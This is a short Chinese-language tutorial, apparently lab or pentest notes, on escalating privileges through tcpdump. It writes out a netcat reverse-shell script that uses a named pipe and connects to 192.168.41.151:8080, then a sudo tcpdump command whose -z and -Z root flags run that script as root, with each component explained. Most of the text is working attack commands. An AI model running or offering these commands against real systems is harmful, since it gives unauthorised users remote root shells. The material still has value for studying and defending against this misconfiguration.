### tcpdump 指令提权

编辑一个 `shell.sh` 文件

```bash
mknod backpipe p && nc 192.168.41.151 8080 0<backpipe | /bin/bash 1>backpipe
```

- `mknod backpipe p`
  - `mknod`：创建特殊文件
  - `backpipe`：文件名
  - `p`：表示 **命名管道（named pipe / FIFO）**
     ✅ 功能：创建一个**双向通道**，让两个进程可以通过它通信
- `&&`
  - 表示“前一个命令成功才执行后面的命令”
  - 保证管道创建成功后再继续

- `nc 192.168.41.151 8080`
  - netcat 命令，连接到远程 IP `192.168.41.151` 的端口 `8080`
  - 作用：建立一个 TCP 连接（反弹连接）
- `0<backpipe`
  - 将标准输入（stdin）重定向为 `backpipe`
  - 意思是 bash shell 的输入来自这个管道
- `/bin/bash`
  - 启动一个新的 bash shell
  - 输入来自管道，输出重定向到管道
- `1>backpipe`
  - 将标准输出（stdout）重定向到同一个管道
  - 所以 bash 的输出会回传给 netcat
- `|` 管道
  - 将 netcat 的输出送入 bash 的输入
  - 实现双向通信

**（记得加执行权限）**

![](https://pic1.imgdb.cn/item/68d367bac5157e1a882c6f71.png)

```
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/shell.sh -Z root
```

| 参数               | 含义                                         |
| ------------------ | -------------------------------------------- |
| `sudo`             | 以 root 权限运行 tcpdump                     |
| `tcpdump`          | 网络抓包工具                                 |
| `-l`               | 行缓冲，方便实时输出                         |
| `-n`               | 不做 DNS 解析，显示 IP                       |
| `-i eth0`          | 指定抓包接口 eth0                            |
| `-w /dev/null`     | 抓包数据写入 `/dev/null`，即丢弃数据         |
| `-W 1`             | 指定最多轮转 1 个抓包文件                    |
| `-G 1`             | 每 1 秒轮转一次抓包文件                      |
| `-z /tmp/shell.sh` | 每轮转抓包文件后执行指定脚本 `/tmp/shell.sh` |
| `-Z root`          | 用 root 权限执行 `-z` 脚本                   |

![](https://pic1.imgdb.cn/item/68d3666ac5157e1a882c6c8b.png)